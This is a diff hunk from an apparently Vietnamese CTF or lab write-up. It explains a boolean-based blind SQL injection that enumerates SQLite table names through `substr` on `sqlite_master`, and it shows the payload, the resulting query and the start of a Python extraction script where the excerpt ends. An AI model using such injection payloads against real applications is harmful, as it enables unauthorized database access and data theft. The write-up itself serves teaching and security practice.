@@ -51,7 +51,7 @@ thành
 - Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau `SELECT * FROM API WHERE id LIKE '%1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--%'`
 - `select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'` sẽ trả về tên của tất cả các bảng
 - `substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1)` sẽ lấy 1 ký tự a bắt đầu từ vị trí i
-` 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table'and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--` cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là `SELECT * FROM API WHERE id LIKE '%1'` và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả
+` 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--` cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là `SELECT * FROM API WHERE id LIKE '%1'` và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả
 - Đây là script mình tìm tên của bảng
 ```py
 import string,requests
